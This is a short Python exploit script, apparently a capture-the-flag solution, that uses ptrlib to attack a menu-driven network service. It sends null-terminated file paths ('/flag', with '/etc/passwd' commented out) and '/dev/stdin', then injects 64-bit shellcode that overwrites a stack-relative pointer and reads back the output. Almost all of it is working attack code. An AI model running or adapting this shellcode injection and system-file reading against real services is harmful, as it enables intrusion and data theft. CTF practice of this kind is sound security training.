import os
import time
from ptrlib import *

HOST = os.getenv('HOST', 'localhost')
PORT = 31337 #os.getenv('PORT', 31337)

def run_files(name):
    sock.sendlineafter(": ", "1")
    sock.sendlineafter("> ", name)
def check():
    sock.sendlineafter(": ", "2")

#sock = Process("./challenge", cwd="handout")
sock = Socket(HOST, PORT)
stream = sock

PATH_TOML = "/flag\0"
#PATH_TOML = "/etc/passwd\0"

shellcode = nasm(f"""
mov r15, [rsp+0x30]
sub rdx, 0x200c
mov [r15+0x60], rdx
ret
""", bits=64)

run_files(PATH_TOML)
run_files(PATH_TOML)
run_files("/dev/stdin")
sock.send(shellcode)

time.sleep(0.5)
sock.sendlineafter(": ", "2")
time.sleep(0.5)
sock.sendlineafter(": ", "2")
time.sleep(0.5)
sock.sendlineafter(": ", "2")
time.sleep(0.5)
sock.sendlineafter(": ", "2")

while True:
    try:
        print(sock.recvline(timeout=1))
    except TimeoutError:
        break

sock.close()
